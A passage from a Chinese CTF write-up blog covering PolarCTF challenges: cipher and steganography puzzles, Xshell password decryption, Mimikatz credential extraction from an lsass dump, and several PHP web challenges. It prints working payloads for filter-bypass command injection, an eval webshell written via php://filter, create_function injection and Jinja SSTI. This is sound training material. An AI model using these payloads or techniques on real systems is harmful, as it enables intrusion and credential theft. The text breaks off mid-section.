class="line">~呜喵喵喵喵呜啊喵啊呜呜喵呜呜~喵喵~啊喵啊呜喵喵~喵~喵~呜呜喵呜啊喵喵喵呜啊呜~啊呜喵呜呜啊呜~~啊喵啊呜喵喵~喵~喵~呜喵呜呜~喵喵喵呜啊喵呜啊呜喵呜呜啊呜呜~啊喵啊呜喵喵~喵~喵~呜喵呜~~喵喵喵呜呜呜呜啊呜喵呜呜啊呜喵喵啊喵啊呜喵喵~啊~喵~呜喵呜喵啊喵喵喵呜啊喵呜呜呜喵呜呜~喵啊~啊喵啊呜~呜喵呜~喵~呜呜喵呜呜喵喵喵呜啊喵呜呜呜喵呜呜啊呜~喵啊喵啊呜~呜啊~~喵~呜呜喵呜喵喵喵喵呜呜呜啊~呜喵呜呜啊呜啊~啊喵啊呜喵喵~呜~喵~呜喵呜~~喵喵喵呜呜呜呜~呜喵呜呜啊呜~啊啊喵啊呜喵喵喵喵~喵~呜喵呜喵~喵喵喵呜呜呜呜呜呜喵呜呜~喵~喵啊喵啊呜~呜喵~~喵~呜呜喵呜喵喵喵喵呜呜呜啊呜呜喵呜呜~呜呜喵啊</span><br></pre></td></tr></table></figure><p>兽音译者<code>https://roar.iiilab.com/</code><br><img src="/images/polarctf/image-20231208094202833.png" alt="image-20231208094202833"></p><h5 id="docx隐写"><a href="#docx隐写" class="headerlink" title="docx隐写"></a>docx隐写</h5><p>打开word，全选改一下颜色即可，<img src="/images/polarctf/image-20231215155553572.png" alt="image-20231215155553572"></p><p>将docx改为zip，解压就能看到最后一段flag了</p><p><img src="/images/polarctf/image-20231215155409671.png" alt="image-20231215155409671"></p><h5 id="Xshell密码破解"><a href="#Xshell密码破解" class="headerlink" title="Xshell密码破解"></a>Xshell密码破解</h5><p>xshell文件解密，题目描述：这是一道贴合实际攻击场景的一道题，在一次溯源反制的过程中，purplet被蓝队大佬反制，自己的电脑竟被控制住了，蓝队大佬在从purplet的目标机中查到一段令人不解的数字：S-1-5-21-323397330-1794634962-2946154912-1001，同时还得到了一个Xshell的配置文件，他们想知道purplet这个人的Xshell连接过的服务器密码是多少，你能帮助他们破解开么？<br>flag{MD5（密码）}</p><p>这里给了一个xsh的文件，用这个项目的脚本解密</p><p><code>https://github.com/HyperSine/how-does-Xmanager-encrypt-password</code></p><p><code>python3 .\XShellCryptoHelper.py -d -ver 6.0 -user purplet -sid S-1-5-21-323397330-1794634962-2946154912-1001 vYZ6tni/wCY0aWv83Tu+0UvW5hCYP1gMOl8o/zF5LIJkmHsIpz1l1Avnog==</code></p><p>在这里面user可以猜到时purplet，sid给了，pass和ver都给了，直接解即可<code>nicaicai!23</code></p><p><img src="/images/polarctf/image-20231220210341006.png" alt="image-20231220210341006"></p><p>在md5即可</p><h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h5><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>描述：峰哥某一天通过3389端口的CVE-2019-0708漏洞拿到了一台目标机器，并新建了一个管理员用户，远程登陆了目标主机，他知道内网中很多机器的密码会因为人为设置会出现相同的情况，所以它为了继续横向渗透，利用procdump工具提取了用户登录凭据，你能帮他继续破解出登录密码么？flag格式：flag{md5(登录密码)}<br>解开压缩包是一个dmp文件，提示了mimikatz,那应该就是本地文件读密码了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#放在相同木录下，即可</span><br><span class="line">minidump lsass.dmp</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="/images/polarctf/image-20240112164350866.png" alt="image-20240112164350866"></p><p>toor的md5</p><h5 id="简单rce"><a href="#简单rce" class="headerlink" title="简单rce"></a>简单rce</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PolarD&amp;N CTF</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no</span>(<span class="params"><span class="variable">$txt</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i&quot;</span>, <span class="variable">$txt</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$txt</span>;&#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;what&#x27;s up&quot;</span>);&#125;&#125;</span><br><span class="line"><span class="variable">$yyds</span>=(<span class="variable">$_POST</span>[<span class="string">&#x27;yyds&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>])&amp;&amp;<span class="variable">$yyds</span>==<span class="string">&#x27;666&#x27;</span>)&#123;</span><br><span class="line">  <span class="keyword">eval</span>(no(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;<span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> nonono</span><br></pre></td></tr></table></figure><p><code>http://d66cc31d-7e85-4966-b532-b847f685bad3.www.polarctf.com:8090/?sys=passthru(&#39;ca&quot;&quot;t$&#123;IFS&#125;/flag&#39;);</code></p><p><code>http://d66cc31d-7e85-4966-b532-b847f685bad3.www.polarctf.com:8090/?sys=passthru(&#39;ls$&#123;IFS&#125;/&#39;);</code></p><h5 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PolarD&amp;N CTF</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>file_put_contents 绕过死亡die写shell，用base64 或者rot等绕过<code>https://www.freebuf.com/articles/web/266565.html</code></p><p>?filename=php://filter/convert.base64-decode/resource=1.php</p><p>content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</p><h5 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h5><p>view-source:<a href="http://d471787d-afe0-4441-beee-5dacb2a31213.www.polarctf.com:8090/.index.php.swp">http://d471787d-afe0-4441-beee-5dacb2a31213.www.polarctf.com:8090/.index.php.swp</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">function jiuzhe($xdmtql)&#123;</span><br><span class="line">    return preg_match(&#x27;/sys.*nb/is&#x27;,$xdmtql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$xdmtql=@$_POST[&#x27;xdmtql&#x27;];</span><br><span class="line">if(!is_array($xdmtql))&#123;</span><br><span class="line">    if(!jiuzhe($xdmtql))&#123;</span><br><span class="line">        if(strpos($xdmtql,&#x27;sys nb&#x27;)!==false)&#123;</span><br><span class="line">            echo &#x27;flag&#123;*******&#125;&#x27;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#x27;true .swp file?&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;nijilenijile&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抄的，<a href="https://blog.csdn.net/weixin_46029520/article/details/130173887![image-20231215161023782](/images/polarctf/image-20231215161023782.png)">https://blog.csdn.net/weixin_46029520/article/details/130173887![image-20231215161023782](/images/polarctf/image-20231215161023782.png)</a></p><h5 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag in $flag</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$c=$_POST[&#x27;sys&#x27;];</span><br><span class="line">$key1 = 0;</span><br><span class="line">$key2 = 0;</span><br><span class="line">if(isset($_GET[&#x27;flag1&#x27;]) || isset($_GET[&#x27;flag2&#x27;]) || isset($_POST[&#x27;flag1&#x27;]) || isset($_POST[&#x27;flag2&#x27;])) &#123;//不能有flag12等</span><br><span class="line">    die(&quot;nonononono&quot;);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class="line">extract($_POST);接受post传参</span><br><span class="line">if($flag1 == &#x27;8gen1&#x27; &amp;&amp; $flag2 == &#x27;8gen1&#x27;) &#123;</span><br><span class="line">    if(isset($_POST[&#x27;504_SYS.COM&#x27;]))&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\?/&quot;, $c))&#123;</span><br><span class="line">         eval(&quot;$c&quot;);  </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//http://b19e6d80-35bf-4b97-96a4-3ab7636527a6.www.polarctf.com:8090/?_POST[flag1]=8gen1&amp;_POST[flag2]=8gen1</span><br><span class="line">post:</span><br><span class="line">504[SYS.COM=1&amp;sys=echo $flag;&amp;</span><br></pre></td></tr></table></figure><h5 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pass</span> = md5(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr(<span class="variable">$pass</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$pass</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$pass</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$pass</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((intval(substr(<span class="variable">$pass</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$pass</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$pass</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$pass</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$pass</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接bp加载数字，一般都很小，</p><p><img src="/images/polarctf/image-20231215165948200.png" alt="image-20231215165948200"></p><h5 id="再来ping一波啊"><a href="#再来ping一波啊" class="headerlink" title="再来ping一波啊"></a>再来ping一波啊</h5><p>ban了很多，连/ 都办了，那估计在环境变量里了。</p><p><img src="/images/polarctf/image-20231215171714420.png" alt="image-20231215171714420"></p><p>可是环境变量的flag也不对，那估计还在index.php中，<code>/?ip=|echo%09Y2F0IGluZGV4LnBocA==|base64%09-d|sh</code></p><p><img src="/images/polarctf/image-20231215172622851.png" alt="image-20231215172622851"></p><h5 id="wu"><a href="#wu" class="headerlink" title="wu"></a>wu</h5><p>无字母数字rce</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(eval($_POST[1])); (~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6);</span><br></pre></td></tr></table></figure><h5 id="蜜雪冰城吉警店"><a href="#蜜雪冰城吉警店" class="headerlink" title="蜜雪冰城吉警店"></a>蜜雪冰城吉警店</h5><p>打开页面，看源码有js混淆，解不开，然后随便把一个id改为9即可，这里注意。他会自动跳到js的debugger，tcl，怎么跳都跳不出来，其实直接吧f12关掉即可，再去点</p><p><img src="/images/polarctf/image-20231219094406677.png" alt="image-20231219094406677"></p><h5 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h5><p>扫目录啥也没有扫到，bp抓包，有hint，解一下</p><p><img src="/images/polarctf/image-20231219103753764.png" alt="image-20231219103753764"></p><p><a href="http://7e389493-2661-409f-a5d7-6b2bad00852e.www.polarctf.com:8090/n0_0ne_f1nd_m3/">http://7e389493-2661-409f-a5d7-6b2bad00852e.www.polarctf.com:8090/n0_0ne_f1nd_m3/</a></p><p>base被ban了，rot即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the 504sys&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag|data|base|write|input/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I am sorry but no way!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//imposible.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//http://7e389493-2661-409f-a5d7-6b2bad00852e.www.polarctf.com:8090/n0_0ne_f1nd_m3/?text=data://text/plain,welcome to the 504sys&amp;file=php://filter/read=string.rot13/resource=imposible.php</span></span><br></pre></td></tr></table></figure><h5 id="veryphp"><a href="#veryphp" class="headerlink" title="veryphp"></a>veryphp</h5><p>开局给到一个php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">qwq</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Access Denied!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">oao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        show_source(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\_|\.|%|\*|\~|\^|\&#x27;|\&quot;|\;|\(|\)|\]|g|e|l|i|\//is&#x27;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;I am sorry but you have to leave.&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shaw_root</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\-[a-e][^a-zA-Z0-8]&lt;b&gt;(.*)&gt;&#123;4&#125;\D*?(abc.*?)p(hp)*\@R(s|r).$/&#x27;</span>, <span class="variable">$shaw_root</span>)&amp;&amp; strlen(<span class="variable">$shaw_root</span>)===<span class="number">29</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Almost there.&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Input correct parameters&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ans</span>===<span class="variable">$SecretNumber</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Congratulations!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    call_user_func(<span class="variable">$my_ans</span>);</span><br><span class="line">&#125; I am sorry but you have to leave.</span><br></pre></td></tr></table></figure><p>post的数据给到str，str的字符不能有这些，这里需注意下面有个_可以用[代替，</p><p>然后是一个正则，^-[a-e]：以-开头a-e</p><p>[^a-zA-Z0-8] 不能是这些，那就9</p><p><b>(.*)&gt;{4}：带<b></p><p>(.*)&gt;{4}: 匹配到4个&gt;</p><p>\D*?:应该是任意字符</p><p>(abc.*?)：abc开头</p><p>p(hp)*：php</p><p>@R(s|r).$： @R s或者r 任意结尾</p><p>所有字符为29位，如果不知道这些，可以一点一点匹配</p><p><code>shaw[root=-a9&lt;b&gt;&gt;&gt;&gt;&gt;aaaaaaaaaabcphp@Rsr</code></p><p><img src="/images/polarctf/image-20231220220211554.png" alt="image-20231220220211554"></p><p><code>&lt;/code&gt;Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)==166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)===5</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">def mohu_md5():</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">10000</span>,<span class="number">99999</span>):</span><br><span class="line">        t1 =  str(i)+<span class="string">&#x27;XIPU&#x27;</span></span><br><span class="line">        t1 =  <span class="string">&#x27;shaw&#x27;</span>+str(i)+<span class="string">&#x27;root&#x27;</span></span><br><span class="line">        md5_result = hashlib.md5(t1.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">        <span class="comment">#print(md5_result)</span></span><br><span class="line">        <span class="keyword">if</span> md5_result == <span class="string">&#x27;166b47a5cb1ca2431a0edfcef200684f&#x27;</span>:</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">print</span>(t1 + <span class="string">&quot;-----&gt;&quot;</span>+md5_result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">mohu_md5()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shaw21475root-----&gt;166b47a5cb1ca2431a0edfcef200684f</span><br></pre></td></tr></table></figure><p>最后静态调用classqwq里的oao</p><p><code>shaw[root=-a9&lt;b&gt;&gt;&gt;&gt;&gt;aaaaaaaaaabcphp@Rsr&amp;ans=21475&amp;my[ans=qwq::oao</code></p><h5 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h5><p>拿到地址，注册和登录，随便注册一个，登录的时候抓包，会给我们一个cookie</p><p><img src="/images/polarctf/image-20231225095047221.png" alt="image-20231225095047221"></p><p>爆破该jwt密钥，<code>https://github.com/brendan-rius/c-jwt-cracker</code></p><p><code>└─# ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEifQ.nioJtqW7tqRWVFsBsXjkJdjYx1NQM3NZZke8vUII6-8 Secret is &quot;SYSA&quot;</code></p><p>可以跑出来密钥位SYSA,<img src="/images/polarctf/image-20231225095558666.png" alt="image-20231225095558666"></p><p>到网站填写密钥，将用户名改为admin，拿到的jwt传回去即可</p><p><img src="/images/polarctf/image-20231225095659919.png" alt="image-20231225095659919"></p><h5 id="某函数的复仇"><a href="#某函数的复仇" class="headerlink" title="某函数的复仇"></a>某函数的复仇</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag:/flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shaw&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$shaw</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;shaw&#x27;</span>];</span><br><span class="line">    <span class="variable">$root</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;root&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z_]*$/isD&#x27;</span>,<span class="variable">$shaw</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/rm|ch|nc|net|ex|\-|de|cat|tac|strings|h|wget|\?|cp|mv|\||so|\$/i&#x27;</span>,<span class="variable">$root</span>))&#123;</span><br><span class="line">            <span class="variable">$shaw</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$root</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Almost there^^&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>给了源码，传两个参数，动态命令执行，但是 $shaw(‘’,$root);这里前面是空，也就是要传两个参数，<br>creater_function 符合，</p><p>GET:POST /?root=2;}system(‘ca””t%09/flag’);// HTTP/1.1</p><p>POST:shaw=create_function</p><p>这样传参数就会是这样的</p><p>源代码：<br>function fT($a) {<br>  echo “test”.$a;<br>}</p><p>注入后代码：<br>function fT($a) {<br>  echo “test”2;}<br>  system(‘ca””t%09/flag’);此处为注入代码。<br>}</p><h5 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h5><p>没有任何过滤</p><p><code>http://59a4cdbc-3575-48d2-9721-3469502ed8eb.www.polarctf.com:8090/?name=&#123;%for(x)in().__class__.__base__.__subclasses__()%&#125;&#123;%if'war'in(x).__name__ %&#125;&#123;&#123;x()._module.__builtins__['__import__']('os').popen('cat /flag').read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</code></p><h5 id="flask-pin"><a href="#flask-pin" class="headerlink" title="flask_pin"></a>flask_pin</h5><p>什么是pin码？<br>pin码是flask应用在开启debug的模式下，进入控制台调试模式下所需的进入密码。相当于是pyshell</p><p>PIN<strong>是Werkzeug（它是Flask 的依赖项之一）提供的额外安全措施，以防止在不知道PIN 的情况下访问调试器</strong>。 您可以使用浏览器中的调试器引脚来启动交互式调试器。 请注意，无论如何，您都不应该在生产环境中使用调试模式，因为错误的堆栈跟踪可能会揭示代码的多个方面。</p><p>在ctf中如果出现报错，点击右边的shell，就会弹出输入pin，输入后就会得到一个python的shell，那么就可以任意操作了。</p><p><img src="/images/polarctf/image-20240116141409456.png" alt="image-20240116141409456"></p><p><img 